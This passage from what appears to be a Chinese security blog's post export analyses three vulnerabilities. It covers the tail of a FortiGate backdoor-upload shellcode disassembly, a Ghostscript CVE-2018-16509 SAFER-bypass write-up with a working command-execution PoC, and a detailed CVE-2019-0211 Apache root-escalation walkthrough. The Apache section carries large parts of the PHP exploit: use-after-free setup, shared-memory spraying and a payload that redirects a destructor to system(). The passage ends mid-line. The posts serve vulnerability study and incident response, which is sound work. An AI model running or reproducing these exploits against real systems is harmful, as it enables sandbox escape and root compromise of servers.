socket fd 0x6 push ebx mov eax, 3 int 80h ; LINUX - sys_read cmp eax, 25h ; &apos;%&apos; jnz loc_A56D40C mov eax, [ebp-10h] mov ebx, [eax+8] mov ecx, [eax+0Ch] xor ebx, ecx ; filesize mov [ebp-8], ebx mov esi, [ebp-10h] add esi, 18h mov edi, [ebp-424h] mov ecx, 8 rep movsb xor eax, eax mov [ebp-428h], eax jmp open 上述步骤完成后，用open系统调用在防火墙上打开一个文件，并且再次使用read接收后门文件。1234567891011sys_open: mov edx, 1C0h ; mode(-rwx------) push edx mov ecx, 241h push ecx ; flags push ebx ; filename mov eax, 5 int 80h ; LINUX - sys_open mov [ebp-0Ch], eax ; nopen fd xor eax, eax mov [ebp-1Ch], eax 再次通过write将接收到的后门文件数据写入刚才打开的文件中。1234567891011121314151617181920sys_write2: inc edi loop loc_A56D368 mov [ebp-428h], edx mov edx, [ebp-14h] ; len push edx mov ecx, [ebp-10h] ; addr push ecx mov ebx, [ebp-0Ch] ; backdoor fd push ebx mov eax, 4 int 80h ; LINUX - sys_write mov ecx, [ebp-1Ch] add ecx, eax mov [ebp-1Ch], ecx mov ecx, [ebp-8] sub ecx, eax mov [ebp-8], ecx jcxz loc_A56D3B2 ; loop until the file write complete jmp short sys_read2 文件接收并写入完成后，关闭文件，并且发送第二个确认字符ack2，确认上传后门文件的完整性。12345678910111213sys_write3: mov eax, [ecx+0Ch] mov ebx, [ebp-1Ch] ; filesize xor eax, ebx mov [ecx+8], eax mov edx, 25h ; &apos;%&apos; ; len push edx push ecx mov ebx, [ebp-4] ; socket fd push ebx mov eax, 4 int 80h ; LINUX - sys_write jmp short loc_A56D40C 最后调用execve，将当前httpsd进程替换为后门程序123456789101112sys_execve: push eax push edi mov edx, esp push eax push esi mov ecx, esp push edx ; envp push ecx ; argv push ebx ; path mov eax, 0Bh int 80h ; LINUX - sys_execve Tip: 要从EGREGIOUSBLUNDER中直接提取shellcode可能有些困难，所以可以在GDB调试时，等待shellcode自解码完成后dump出指定位置内存放入IDA中分析。另外以上过程省略了一些细节，有兴趣的读者可以自己试试。 总结算起来这应该是笔者分析的第一个二进制漏洞吧，虽然只是一个经典的栈溢出，且目标没有ASLR、NX、Canary等漏洞缓解机制，但当时分析的时候还是感觉很过瘾。特别植入后门的工程化和专业化都很让人着迷，所以在此和大家一同分享，当然因为是第一次分析二进制漏洞，而且时间过去太久，如果文中有任何错误和疏漏欢迎在留言中指出☺。 参考资料FortiGate Configuration examplestar formart (wikipedia)#UStar_format)FortiGate CLI HACKINGShellcoder’s Programming Uncovered（《shellcoder编程揭秘 》【美】Kris Kaspersky著）","link":"/post/d4ec6e34.html"},{"title":"CVE-2018-16509——Ghostscript沙箱逃逸漏洞","text":"2018年8月21日，Google安全研究员Tavis Ormandy披露了多个GhostScript的漏洞，在9.24之前的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析PostScript的”restore“命令时，会暂时将参数“LockSafetyParams”设置为“False”，从而关闭SAFER模式。 开始分析前，先得说一说PostScript——由Adobe开发的一种页面描述语言（PDL），它桌面出版革命中发挥了关键作用。它是世界上第一个与设备无关的页面描述语言，也是一种编程语言。如今世界各地的企业都依赖PostScript来准确地打印来自任何应用程序的文档，同时也为Adobe PDF格式的发展铺平了道路。 作为一种解释型的语言，PostScript必然需要一个解释器来执行，Ghostscript就是一个广泛应用于各种平台和应用程序的PostScript解释器，ImagineMagic、Python PIL等常用工具都依赖于它。 环境搭建目前大多数Linux发行版中的GhostScript都应该已经更新了，所以我们需要从源码编译安装，可以从GitHub下载源码，也可以通过git工具下载。 安装环境：Ubuntu Server 16.04.04 64位集成环境：GCC 5.4.0调试环境：GDB-7.11.1 123456$ tar xvJf ghostscript-9.23.tar.xz$ cd ghostscript-9.23$ apt-get build-dep ghostscript #安装所需依赖$ CFLAGS=\"-g -O0\" ./configure #CFLAGS中的两个选项是为了方便后续的调试$ make$ make install 安装完成就可进入GhostScript的交互界面了 12345$ gs -sDEVICE=ppmrawGPL Ghostscript 9.23 (2018-03-21)Copyright (C) 2018 Artifex Software, Inc. All rights reserved.This software comes with NO WARRANTY: see the file PUBLIC for details.GS&gt; 漏洞分析Ghostscript安全模式Ghostscript包含一个可选的-dSAFER选项，设置该选项启动安全沙箱模式后，与文件相关的操作符将被禁止，具体作用如下： 禁用deletefile和renamefile操作符，能够打开管道命令（％pipe％cmd），同时只能打开stdout和stderr进行写入 禁用读取stdin以外的文件 设置设备的LockSafetyParams参数为True，从而防止使用OutputFile参数写入文件 阻止/GenericResourceDir、/FontResourceDir、/SystemParamsPassword或/StartJobPassword被更改 例如当我们未加-dSAFER参数时，可以成功读取/etc/passwd文件：123456789vuln@ubuntu:~$ gs -q -sDEVICE=ppmrawGS&gt;/buff 1024 string defGS&gt;/file_obj (/etc/passwd) (r) file defGS&gt;file_obj buff readstringGS&lt;2&gt;buff printroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin... 加上-dSAFER参数后，出现invalidfileaccess错误：1234567891011121314vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw -dSAFERGS&gt;/buff 1024 string defGS&gt;/file_obj (/etc/passwd) (r) file defError: /invalidfileaccess in --file--Operand stack: file_obj (/etc/passwd) (r)Execution stack: %interp_exit .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval-- --nostringval-- %loop_continue --nostringval-- --nostringval-- false 1 %stopped_push .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval--Dictionary stack: --dict:982/1684(ro)(G)-- --dict:0/20(G)-- --dict:79/200(L)--Current allocation mode is localLast OS error: No such file or directoryCurrent file position is 33GS&lt;3&gt; PoC分析测试多个PostScript操作可以绕过-dSAFER提供的保护，这可以允许攻击者使用任意参数执行命令。首先对Tavis提供的PoC进行测试，在开启了安全沙箱的情况下（-dSAFER），可以成功执行任意shell命令： 1234567vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/nullGS&gt;legalGS&gt;{ null restore } stopped { pop } ifGS&gt;legalGS&gt;mark /OutputFile (%pipe%id) currentdevice putdevicepropsGS&lt;1&gt;showpageuid=1000(topsec) gid=1000(topsec) groups=1000(topsec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) 再比如使用前面提到的ImageMagick工具中的convert命令测试，可以看到ImageMagick同样受到了该漏洞的影响： 在源码目录下使用命令grep -nr dSAFER找到和该选项相关的信息，看到下面这段注释中说明了该选项的效果——将LockSafetyParams设置为true。 再次使用grep命令查看和LockSafetyParams相关的代码，通过注释看到，这个变量值为true时，可以阻止某些不安全的更改。 同时在文件psi/zdevice2.c的第269行，LockSafetyParams被设置为了False，且仅有此处修改了该变量，因此可以推测：Ghostscript在解析PoC中某条PostScript语句时触发了这段代码。 调试分析过程接下来我们通过调试来验证前面的猜想，使用GDB调试Ghostscript并设置好程序参数，根据前面grep的输出，在“dev_old-&gt;LockSafetyParams = false; ”这段代码所在函数restore_page_device()中设置断点。 12345678pwndbg&gt; set args -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/nullpwndbg&gt; b restore_page_deviceBreakpoint 1 at 0xa9395e: file ./psi/zdevice2.c, line 256.pwndbg&gt; rStarting program: /usr/local/bin/gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.GS&gt; 程序运行起来后，根据PoC输入代码： 首先设置成像区域——legal（a4、b5、letter等也可以）： 接着输入{null restore} stopped {pop} if，程序中断在此处： 再对dev_old-&gt;LockSafetyParams变量设置观察点，继续运行程序两次以后，和我们预想的结果一样——LockSafetyParams的值在这里被改变了。 123456789pwndbg&gt; cContinuing.Hardware watchpoint 2: dev_old-&gt;LockSafetyParamsOld value = 1New value = 0restore_page_device (pgs_old=0x219cbd8, pgs_new=0x274d630) at ./psi/zdevice2.c:269269 dev_old-&gt;LockSafetyParams = false; 这里要注意的是，用例如GCC开启了优化选项（如-O3），那么某些变量可能会被优化掉，比如这里为变量dev_old-&gt;LockSafetyParams设置观察点时，按照默认配置编译的情况下GDB会提示value has been optimized out，这就是前面编译时要使（-O0）的原因，实际上在调试程序时，我们都应该使用该选项。 使用bt命令查看栈回溯，发现当前函数在一系列带有“interpret”的函数中被调用，从名称推断这些函数用于解析PostScript语句，并且我们现在处于restore操作符相关的函数中。 所以要找到解释器解析操作符的函数，可以使用两次finish命令到栈帧#3中，可以看到interp()函数应该是通过call_operator宏来执行各种操作符的。 在调用call_operator宏的这一行下断，断下后单步跟进call_operator，观察到了解释器处理stop、restore等操作符的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。 漏洞成因探究经过上面的分析我们可以知道简单的一条{null restore} stopped {pop} if就能绕过SAFER沙箱，但其原理又是什么呢，下面就来具体分析一下。 PostScript是一种“逆波兰式”（也称为后缀表达式）的语言，熟悉数据结构的读者想必立刻就明白了。简单来说，就是将操作数放在操作符之前。例如计算表达式(3 + 4) * (5 - 8)的过程如下： 123$ gs -q -sDEVICE=ppmrawGS&gt;3 4 add 5 8 sub mul ==-21 上述代码的每个步骤如下表所示，采用这种方式的好处是不需要对表达式进行语法分析，所以解释器可以设计的较为简单。 处理的符号 操作 栈的内容 3 压栈 3 4 压栈 3 4 add 出栈栈顶两个元素，计算加法，计算结果压栈 7 5 压栈 7 5 8 压栈 7 5 8 sub 出栈栈顶两个元素，计算减法，计算结果压栈 7 -3 mul 出栈栈顶两个元素，计算乘法，计算结果压栈 -21 == 出栈栈顶一个元素，并显示 NULL 大多数的编程语言都实现了异常处理机制，用于处理软件或信息系统中出现的异常状况（即超出程序正常执行流程的某些特殊条件），同样的PostScript也不例外。我们可以通过将代码包含在{…} stopped中来捕获运算符中的错误，就如同PoC中这样 12345{ null restore } stopped { pop} if 对于大多数运算符而言，null不是合法的操作数，stopped捕获到了前面的语句中发生的错误，它将终止该过程并执行stopped操作符后{}中的过程。 完整过程如下： PostScript中有一对运算符save和restore，分别用来保存和恢复虚拟内存状态的快照，PoC中的null restore语句执行时，相关函数restore_page_device()会将LockSafetyParams设置为false，以便它有权限可以正确配置已恢复的设备，但是还未来得及恢复LockSafetyParams的值便引起类型检查错误（/typecheck error）。接着stopped捕获到异常，弹出栈顶元素null，GS继续运行，此时LockSafetyParams就是一直为false的状态。 值得一提的是，GhostScript的官方文档中提到了restore操作符存在导致绕过SAFER模式的风险。 漏洞利用OutputFile参数用于设置输出文件名，另外在Linux/Unix上，还可以通过设备%pipe%将输出发送到管道（Windows中也可以，需要使用两个%）。例如，要将输出通过管道传输到lpr可以使用：/OutputFile (%pipe%lpr）。查阅官方文档可知，%pipe%功能由popen函数支持，在调试中也能确认这一点： popen()函数通过创建管道的方式，调用fork()启动一个子进程，并将传入popen()的命令送到/bin/sh以-c参数执行。可以通过在此处注入命令实现漏洞利用，如下图中演示的那样，另外将PostScript编码到图像中，可以在使用GhostScript的Web服务器上执行任意指令（例如服务器使用ImageMagick处理上传的图像时）。 参考资料More Ghostscript Issues: Should we disable PS coders in policy.xml by default?PostScript Language Reference(third edition)PostScript语言安全研究(ImageMagick新漏洞分析Ghostscript官方文档A GHOST FROM POSTSCRIPT","link":"/post/40555.html"},{"title":"CVE-2019-0211——Apache HTTP组件提权漏洞利","text":"前段时间Apache HTTP 被发现存在本地提权漏洞（CVE-2019-0211），漏洞作者在第一时间就给出了WriteUp和漏洞EXP，当时做了这个漏洞的应急响应，事后也分析了一下该漏洞，在此将分析的笔记整理分享出来，希望对大家理解该漏洞有所帮助。本文内容主要按着EXP的执行步骤一步步讲解，同时详细解释了利用过程中几个比较难理解的点： PHP UAF漏洞的具体利用细节 all_buckets[bucket]是如何指向SHM中伪造的结构以及Heap Spray的问题 如何让apr_proc_mutex_t、zend_array、prefork_child_bucket和zend_object这些Apache和PHP的结构体在内存中相互叠加 漏洞成因作者的WriteUp中对导致漏洞代码已经有了介绍，这里就只是简单提一下，并省略了大部分的源码以减轻阅读负担。 在Apache的MPM prefork模式中，以root权限运行主服务器进程，同时管理一个低特权工作进程（worker）池，用于处理HTTP请求。主进程和worker之间通过一个共享内存（SHM）进行通信。 1.当Apache httpd服务器优雅重启（graceful）时，httpd主进程会杀死旧worker并用新worker替换它们，这就会调用prefork_run()函数产生新的worker： 12345678//server/mpm/prefork/prefork.cstatic int prefork_run(apr_pool_t *_pconf, apr_pool_t *plog, server_rec *s){ /* ... */ make_child(ap_server_conf, child_slot, ap_get_scoreboard_process(child_slot)-&gt;bucket); /* ... */} 2.在该函数中调用make_child()，并使用ap_get_scoreboard_process(child_slot)-&gt;bucket作为参数。make_child()函数会创建新的子进程，同时根据bucket索引读取all_buckets数组到my_bucket： 12345678//server/mpm/prefork/prefork.cstatic int make_child(server_rec *s, int slot, int bucket){ /* ... */ my_bucket = &amp;all_buckets[bucket]; /* ... */ child_main(slot, bucket); /* ... */ 3.调用child_main()，如果Apache侦听多个端口，那么SAFE_ACCEPT(&lt;code&gt;)宏中的\\将会执行，这里apr_proc_mutex_child_init()将会执行： 12345678//server/mpm/prefork/prefork.cstatic void child_main(int child_num_arg, int child_bucket){ /* ... */ status = SAFE_ACCEPT(apr_proc_mutex_child_init(&amp;my_bucket-&gt;mutex, apr_proc_mutex_lockfile(my_bucket-&gt;mutex), pchild)); /* ... */ 4.上述函数进一步调用(*mutex)-&gt;meth-&gt;child_init(mutex, pool, fname)。 12345678//apr-1.7.0//locks/unix/proc_mutex.cAPR_DECLARE(apr_status_t) apr_proc_mutex_child_init(apr_proc_mutex_t **mutex, const char *fname, apr_pool_t *pool){ return (*mutex)-&gt;meth-&gt;child_init(mutex, pool, fname);} 整个简化的流程如下： 1234567prefork_run() make_child(bucket) my_bucket = &amp;all_buckets[bucket]; child_main(bucket) SAFE_ACCEPT(apr_proc_mutex_child_init) apr_proc_mutex_child_init(my_bucket-&gt;mutex) mutex-&gt;meth-&gt;child_init(&amp;my_bucket-&gt;mutex)//覆盖child_init()的指针来指向代码 如果我们在共享内存中伪造一个prefork_child_bucket结构（即all_buckets数组的元素），并修改all_buckets数组的索引bucket，就可以在第三行处的代码控制my_bucket指向该结构。 进而在后续代码执行my_bucket-&gt;mutex-&gt;meth-&gt;child_init(mutex, pool, fname)，meth结构包含指向多个函数的指针，因此，将其中的child_init函数的指针覆盖为我们想要执行函数的指针，就可以达到漏洞利用的目的，并且此时进程还是处于root权限的，后面才降低自身的权限。 漏洞利用作者在其WriteUp将利用过程分为四个步骤，但实际的exp要比他写得更繁琐一点，在顺序上也稍微有些不同。以下是根据exp执行步骤整理的流程，补充了一些细节： 利用PHP读取worker的/proc/self/maps文件，进而定位一些漏洞利用所需模块和函数的地址 枚举/proc/*/cmdline和/proc/*/status文件，得到所有worker进程的PID 利用一个PHP的UAF漏洞，在worker进程中获取读/写SHM的权限 遍历Apache的内存，根据内存模式匹配找到与all_buckets数组地址 因为优雅重启后，all_buckets的位置会改变，因此需要计算一个”适当”的bucket索引，保证all_buckets[bucket]仍然指向伪造的prefork_child_bucket结构 在SHM中构造payload 喷射payload之后剩余的SHM区域，确保第5步中all_buckets[bucket]指向这片区域后，能转跳到payload 将process_score-&gt;bucket修改为第5步中计算的bucket。此外为了进一步提高成功率，还可以枚举SHM区域所有的process_score结构，将每个worker的process_score-&gt;pid与第2步得到的PID的相比较，匹配上的就是正确的process_score结构，将每个worker的process_score-&gt;bucket都进行修改。 等待Apache优雅重启触发漏洞（每天早上6:25会自动执行，也可手动重启验证结果） 具体的细节如下图： exp概述get_all_addresses()、get_workers_pids()函数分别取得几个关键内存地址、worker的PID放入全局变量$addresses和$worker_pids中，以便在随后的利用中使用。需要注意如果执行exp时无法解析shm和apache的地址，可能是因为你的环境中shm的大小与exp中查找的范围不一致，可以自己查看一下maps文件，然后修改if ($msize &gt;= 0x10000 &amp;&amp; $msize &lt;= 0x16000)这一行为正确的值即可。 real()函数有两个作用，一是触发PHP的UAF漏洞。二是开始真正的漏洞利用过程，因为Z中定义了jsonSerialize()方法，它会在类实例被序列化的时候调用，即后面执行json_encode()时调用，而所有的利用代码都在jsonSerialize()中。 下面的代码只保留了EXP的基本框架，只为了让大家有一个整体上的概念： 12345678910111213141516171819202122232425262728293031&lt;?phpfunction real(){ global $y; $y = [new Z()]; json_encode([0 =&gt; &amp;$y]);} class Z implements JsonSerializable{ public function jsonSerialize() { ... } ... } ...function get_all_addresses(){ ... } function get_workers_pids(){ ... } $addresses = get_all_addresses();$workers_pids = get_workers_pids();real(); 接下来具体看看jsonSerialize()中的代码。 利用PHP的UAF获取读写SHM的权限还是先概括的讲一讲PHP这个UAF漏洞原理： 1234567891011121314class Z implements JsonSerializable{ public function jsonSerialize() { global $y, $addresses, $workers_pids; ... $this-&gt;abc = ptr2str(0, 79); //ptr2str在这里等同于创建一个字符串 ... unset($y[0]); ... $x = new DateInterval('PT1S'); ... }} 我们在Z中定义了一个字符串$this-&gt;abc（PHP内部使用zend_string表示），就好比C中malloc一块内存 接着unset($y[0])（Z的实例），就像”free“掉刚才分配的内存 然后再请求分配一个和刚才释放大小相同的内存块，这里使用的是DateInterval（PHP的对象内部实现往往由几个结构体组成，这里其实是DateInterval中的timelib_rel_time和zend_string大小相同），于是DateInterval就占据了原来字符串的位置，如下图所示： 此时$this-&gt;abc仍然可用并指向原来的位置，于是我们可以通过修改DateInterval来控制字符串$this-&gt;abc。 PHP字符串的内部实现如下，用一个zend_string表示，通过成员变量len来判断字符串长度，从而实现二进制安全。我们修改DateInterval的属性间接修改len的大小就可以通过this-&gt;abc读写SHM区域了。当然，为了能够成功利用漏洞，还有许多细节需要考虑。 123456struct _zend_string { zend_refcounted gc; zend_ulong h; size_t len; char val[1];}; 填充空闲内存块在脚本运行之前可能发生了大量的分配/释放，因此同时实例化的两个变量也不一定是连续的，为解决这个问题，实例化几个DateInterval对象填充不连续空闲块，以确保后面分配的内存是连续的： 12345$contiguous = [];for($i=0;$i&lt;10;$i++) $contiguous[] = new DateInterval('PT1S');$_protector = ptr2str(0, 78); 创建保护内存块为了保证UAF后我们控制的结构属于一块空闲内存，如果我们之后创建其他变量，那么这些变量可能会破坏我们已经控制的结构，为了避免这种情况，这里分配了很多对象Z的实例，后面的代码中会将其释放，由于PHP的堆LIFO的特点，这些释放掉的内存会优先于UAF的那块内存分配，从而保护被我们控制的结构。123$room = [];for($i=0;$i&lt;10;$i++) $room[] = new Z(); 函数ptr2str的作用相当于在内存中分配一个大小为78的zend_string结构，为什么是78这个大小接下来会提到。1$_protector = ptr2str(0, 78); 分配UAF的字符串接着创建字符串$this-&gt;abc，也就是一个zend_string结构，通过对它进行UAF，进而读写共享内存。 12$this-&gt;abc = ptr2str(0, 79);$p = new DateInterval('PT1S'); 创建$p的目的是为了保护$this-&gt;abc，前面说过，一个PHP对象往往由许多结构组成，而DateInterval中的timelib_rel_time结构大小就刚好为78，这就是前面为何要创建大小78的zend_string的原因。 此时的内存布局如下图所示，这里和下面的所有图示都是为了方便大家理解，因为PHP各种变量、对象都是由好几个结构组成，所以实际的PHP堆内存排布肯定比此复杂。 触发UAF并验证接着unset当前对象$y[0]和$p，unset掉$p意味着释放了DateInterval的timelib_rel_time结构。 12unset($y[0]);unset($p); 此时内存布局如下： 然后我们将分配一个与其大小相同的字符串（$protector），由于PHP堆LIFO的特点，因此字符串将取代timelib_rel_time结构的位置。 12# Protect $p's timelib_rel_time structure$protector = \".$_protector\"; 接着就是最重要的一步： 1$x = new DateInterval('PT1S'); 再次创建一个DateInterval，它的timelib_rel_time结构将刚好占据上图中free的内存位置，同时$this-&gt;abc仍然是可以访问free这块内存的，即：&amp;timelib_rel_time == &amp;zend_string。因此我们可以通过修改DateInterval对象来修改zend_string.len，从而控制可以读/写内存的长度。 完成上述步骤后，我们还需要验证UAF是否成功，看一下DateInterval的定义： 12345678910111213141516DateInterval {/* Properties */public integer $y ;public integer $m ;public integer $d ;public integer $h ;public integer $i ;public integer $s ;public float $f ;public integer $invert ;public mixed $days ;/* Methods */public __construct ( string $interval_spec )public static createFromDateString ( string $time ) : DateIntervalpublic format ( string $format ) : string} 因为有&amp;timelib_rel_time == &amp;zend_string，所以这里的$d和$y分别对应zend_string里的len和val。可以将$x（DateInterval）的h属性设置为0x13121110，再通过$this-&gt;abc字符串（zend_string）访问来判断UAF成功与否。 12345678910111213141516171819# zend_string.refcount = 0$x-&gt;y = 0x00;# zend_string.len$x-&gt;d = 0x100;# zend_string.val[0-4]$x-&gt;h = 0x13121110;if(!( strlen($this-&gt;abc) === $x-&gt;d &amp;&amp; $this-&gt;abc[0] == \"\\x10\" &amp;&amp; $this-&gt;abc[1] == \"\\x11\" &amp;&amp; $this-&gt;abc[2] == \"\\x12\" &amp;&amp; $this-&gt;abc[3] == \"\\x13\")){ o('UAF failed, exiting.'); exit();} o('UAF successful.');; 最后别忘了释放掉$room，产生的空闲块将保护我们控制的结构，后面再新建变量都会优先使用这些内存。 1unset($room); 控制并修改UAF的结构利用这个PHP漏洞的目的是为了能够获取读写SHM的权限，现在我们能够读写zend_string.val的内容，能读写的长度是zend_string.len，因此只要将len的值增加到包括SHM的范围。 这时我们已经知道了SHM的绝对地址，还需要知道abc的绝对地址，得到两者之间的偏移量才可以修改len。因此需要找到字符串$this-&gt;abc在内存中的位置： 1234$address = str2ptr($this-&gt;abc, 0x70 * 2 - 24);$address = $address - 0x70 * 3;$address = $address + 24;o('Address of $abc: 0x' . dechex($address)); 然后我们就可以计算两者间的偏移量了，还要注意的是，因为后面我们需要在内存中查找all_bucket，而它在apache的内存中所以我们的len需要将SHM和apache的内存都覆盖到，所以作者的WriteUp中说SHM和apache的内存都需要在PHP堆之后，而它们也确实都在PHP堆之后。 找SHM和apache的内存两者间较大的值，减去abc的地址，将得到的偏移通过DateInterval的d属性修改来修改zend_string.len。 123$distance = max($addresses['apache'][1], $addresses['shm'][1]) - $address;$x-&gt;d = $distance; 这等同于将zend_string结构（$this-&gt;abc）中的len修改为一个超大的值，一直包括到SHM和Apache内存区域，这下我们就可以读写这个范围内的内存了。 在内存中定位all_buckets根据内存模式查找all_buckets数组的位置，这在作者的writeup中有提到。mutex在all_buckets偏移0x10的位置，而meth在mutex偏移0x8的位置，根据该特征查找all_buckets数组。 首先，在apache的内存中搜索all_buckets[idx]-&gt;mutex，接着验证meth，是否在libapr.so的.data段中，最后因为meth指向libapr.so中定义的函数，因此验证其是否在.text段。满足这些条件的就是我们要找的all_buckets[]结构。 123456789101112131415161718192021$all_buckets = 0;for( $i = $addresses['apache'][0] + 0x10; $i &lt; $addresses['apache'][1] - 0x08; $i += 8){ # mutex $mutex = $pointer = str2ptr($this-&gt;abc, $i - $address); if(!in($pointer, $addresses['apache'])) continue; # meth $meth = $pointer = str2ptr($this-&gt;abc, $pointer + 0x8 - $address); if(!in($pointer, $addresses['libaprR'])) continue; o(' [&amp;mutex]: 0x' . dechex($i)); o(' [mutex]: 0x' . dechex($mutex)); o(' [meth]: 0x' . dechex($meth)); 顺便将meth结构中所有函数指针打印出来，第6个就是我们要用到的(*child_init)()。 1234567891011121314151617 # meth-&gt;* # flags if(str2ptr($this-&gt;abc, $pointer - $address) != 0) continue; # methods for($j=0;$j&lt;7;$j++) { $m = str2ptr($this-&gt;abc, $pointer + 0x8 + $j * 8 - $address); if(!in($m, $addresses['libaprX'])) continue 2; o(' [*]: 0x' . dechex($m)); } $all_buckets = $i - 0x10; o('all_buckets = 0x' . dechex($all_buckets)); break;} 这是meth的结构，可以对照着看一看：12345678910struct apr_proc_mutex_unix_lock_methods_t { unsigned int flags; apr_status_t (*create)(apr_proc_mutex_t *, const char *); apr_status_t (*acquire)(apr_proc_mutex_t *); apr_status_t (*tryacquire)(apr_proc_mutex_t *); apr_status_t (*release)(apr_proc_mutex_t *); apr_status_t (*cleanup)(void *); apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); const char *name;}; 计算索引buckets再回忆一下漏洞利用的方法：在SHM中构造payload （prefork_child_bucket结构），同时将剩余SHM区域喷射payload地址（并非payload起始地址）， 控制指向喷射区域，所以&amp;all_buckets[bucket]中的meth必然指向payload ，而payload中我们已将child_init函数的指针覆盖为我们想要执行函数的指针，就可以达到漏洞利用的目的。 要想控制&amp;all_buckets[bucket]指向prefork_child_bucket结构，不能直接将该结构精确放在某个位置，然后直接计算两者间的偏移，因为all_buckets的地址在每优雅重启后会发生变化，所以漏洞被触发时all_buckets的地址将与我们找到的地址是不同的，这就是作者在EXP中进行堆喷的目的。 all_buckets是一个结构体数组，元素prefork_child_bucket结构由三个指针组成： 12345typedef struct prefork_child_bucket { ap_pod_t *pod; ap_listen_rec *listeners; apr_proc_mutex_t *mutex;} prefork_child_bucket; 如果在SHM中大量喷射一个指向payload的地址，只要让&amp;all_buckets[bucket]落在该区域内，payload就能得到执行，如下图中所示： 并且在EXP中，作者一共使用了两种方法来提高利用成功率： 喷射SHM，也就是上面提到的方法 修改每个worker的process_score-&gt;bucket结构，这样一来，利用成功率就可以再乘以Apache Worker的数量。这也是exp开始时调用$workers_pids = get_workers_pids();的原因。 先看第一种方法的实现： SHM的起始部分是被apache的各个进程使用的，可以用SHM末尾的绝对地址$spray_max，减去未使用的内存空间大小$spray_size，得到要喷射区域的大小$spray_size；而未使用空间的大小可以通过减去已使用worker_score结构的总大小得到。 123456$size_prefork_child_bucket = 24;$size_worker_score = 264;$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);$spray_max = $addresses['shm'][1];$spray_min = $spray_max - $spray_size; 然后找喷射区域地址的中间值，计算它和all_buckets地址的偏移，再除以prefork_child_bucket结构的大小，就可以得到一个all_buckets数组下标索引，但别忘了SHM在all_buckets之前，所以这个索引还要取负值，这个值用$bucket_index_middle表示。 12$spray_middle = (int) (($spray_min + $spray_max) / 2);$bucket_index_middle = (int) ( - ($all_buckets - $spray_middle) / $size_prefork_child_bucket ); 这样做的目的在于，在每优雅重启后，即便all_buckets的地址有所变化，&amp;all_buckets[bucket]指向的位置会在$spray_middle上下浮动，最大程度上保证了该指针落在喷射的内存范围内，如下图所示： 设置payload并喷射SHMPayload由三个部分组成 bucket，用来存放要执行的命令，这是因为payload已经成了几个结构的叠加。 meth，它还是apr_proc_mutex_unix_lock_methods_t结构，只是它的child_init替换成了zend_object_std_dtor，其他指针置空。 properties，这是PHP内部结构zend_object的一个成员。 回忆漏洞的攻击链，最后的child_init被替换成函数zend_object_std_dtor执行，其原型如下，传入一个zend_object结构： 1ZEND_API void zend_object_std_dtor(zend_object *object); 所以原本传给child_init的&amp;my_bucket-&gt;mutex（prefork_child_bucket结构的一部分）就和zend_object相叠加了。 zend_object_std_dtor的执行又导致以下调用链： 12345678910...mutex = &amp;my_bucket-&gt;mutexapr_proc_mutex_child_init(mutex) //(*mutex)-&gt;meth-&gt;child_init() (*mutex)-&gt;meth-&gt;zend_object_std_dtor(object) //[object = mutex] ht = object-&gt;properties zend_array_destroy(ht) zend_hash_destroy(ht) val = &amp;ht-&gt;arData[0]-&gt;val ht-&gt;pDestructor(val) 上面的代码properties是一个zend_array结构，如下所示，我们控制其中的arData，pDestructor，如果我们将上面&amp;ht-&gt;arData[0]-&gt;val放入要执行的命令，pDestructor()覆盖为system的地址，就可以实现命令执行了。 123456789101112struct _zend_array { zend_refcounted_h gc; //... uint32_t nTableMask; Bucket *arData; uint32_t nNumUsed; uint32_t nNumOfElements; uint32_t nTableSize; uint32_t nInternalPointer; zend_long nNextFreeElement; dtor_func_t pDestructor;}; 回到exp中，首先构造bucket部分，放入要执行的命令，没有参数时默认执行”chmod +s /usr/bin/python3.5”，但是自定义的命令长度也不能超过152字节。 12345678910111213141516171819202122# Build payload$payload_start = $spray_min - $size_worker_score;$z = ptr2str(0); # Payload maxsize 264 - 112 = 152 $bucket = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : \"chmod +s /usr/bin/python3.5\"; if(strlen($bucket) &gt; $size_worker_score - 112) { o( 'Payload size is bigger than available space (' . ($size_worker_score - 112) . '), exiting.' ); exit(); } # Align $bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\"); 然后是meth，将原本child_init的指针改为zend_object_std_dtor： 1234567891011# apr_proc_mutex_unix_lock_methods_t $meth = $z . $z . $z . $z . $z . $z . # child_init ptr2str($addresses['zend_object_std_dtor']) ; 经过调试也可以看到child_init被覆盖： 然后是properties（zend_array和apr_proc_mutex_t结构的叠加），u-nTableMask的位置将用作apr_proc_mutex_t结构的meth，而arData指向payload中的bucket。 1234567891011121314151617181920 $properties = # refcount ptr2str(1) . # u-nTableMask meth ptr2str($payload_start + strlen($bucket)) . # Bucket arData ptr2str($payload_start) . # uint32_t nNumUsed; ptr2str(1, 4) . # uint32_t nNumOfElements; ptr2str(0, 4) . # uint32_t nTableSize ptr2str(0, 4) . # uint32_t nInternalPointer ptr2str(0, 4) . # zend_long nNextFreeElement $z . # dtor_func_t pDestructor ptr2str($addresses['system']); 将各部分组合：12345$payload = $bucket . $meth . $properties; 通过前面UAF控制的字符串abc写入SHM未使用部分的开头：1234567891011o('Placing payload at address 0x' . dechex($payload_start));$p = $payload_start - $address;for( $i = 0; $i &lt; strlen($payload); $i++){ $this-&gt;abc[$p+$i] = $payload[$i];} 打印信息，将SHM剩下的部分喷射为properties的地址：12345678910111213141516171819202122$properties_address = $payload_start + strlen($bucket) + strlen($meth);o('Spraying pointer');o(' Address: 0x' . dechex($properties_address));o(' From: 0x' . dechex($spray_min));o(' To: 0x' . dechex($spray_max));o(' Size: 